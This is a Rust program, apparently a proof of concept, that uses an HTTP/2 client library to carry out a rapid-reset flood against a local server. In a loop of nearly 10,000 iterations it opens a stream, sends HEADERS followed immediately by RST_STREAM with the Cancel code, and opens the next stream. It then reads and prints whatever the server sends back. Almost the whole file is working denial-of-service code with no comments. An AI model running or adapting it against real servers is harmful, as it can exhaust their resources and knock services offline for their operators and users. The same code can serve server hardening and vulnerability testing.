use riphttplib::h2::connection::{H2Connection, StreamEvent};
use riphttplib::h2::framing::RstErrorCode;
use riphttplib::types::{ClientTimeouts, FrameH2, Header};
use riphttplib::{FrameBuilderExt, Request};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let url = "https://localhost:8843";
    let timeout = ClientTimeouts::disabled();

    let req = Request::new(url, "GET")?;
    let headers =Request::prepare_pseudo_headers(&req)?;
    let mut connection = H2Connection::connect(url, &timeout).await?;
    let mut stream_id = connection.create_stream().await?;

    for _i in 1..10000 {
        print!("{}\n", stream_id);
        FrameH2::header(stream_id, &headers, false, true)?
            .chain(FrameH2::rst(stream_id, RstErrorCode::Cancel))
            .send(&mut connection)
            .await?;
        stream_id = connection.create_stream().await?;
    }

    let response_count = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let count_clone = response_count.clone();

    let event_handler = move |event: &StreamEvent| {
        let count = count_clone.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;
        println!("Response {}: {:?}", count, event);

        match event {
            StreamEvent::Headers {
                headers,
                end_stream,
                is_trailer,
            } => {
                println!(
                    "  → HEADERS response (end_stream: {}, is_trailer: {})",
                    end_stream, is_trailer
                );
                for header in headers {
                    println!("    {}: {:?}", header.name, header.value);
                }
                if *end_stream {
                    println!("  → Stream ended with headers");
                }
            }
            StreamEvent::Data {
                payload,
                end_stream,
            } => {
                println!("  → DATA response (end_stream: {})", end_stream);
                println!("    Data: {}", String::from_utf8_lossy(&payload));
                if *end_stream {
                    println!("  → Stream ended with data");
                }
            }
            StreamEvent::RstStream { error_code } => {
                println!("  → RST_STREAM received! Error code: {:?}", error_code);
            }
        }
    };

    match connection
        .read_response_options(
            stream_id,
            Some(std::time::Duration::from_secs(5)), // overall timeout
            Some(std::time::Duration::from_millis(1000)), // event timeout
            Some(10),                                // max events
            Some(&event_handler),
        )
        .await
    {
        Ok(_response) => {
            // Response handled by event_handler above
        }
        Err(e) => {
            let final_count = response_count.load(std::sync::atomic::Ordering::SeqCst);
            if final_count == 0 {
                println!("No response received: {}", e);
            } else {
                println!("Error or timeout reading events: {}", e);
            }
        }
    }

    Ok(())
}
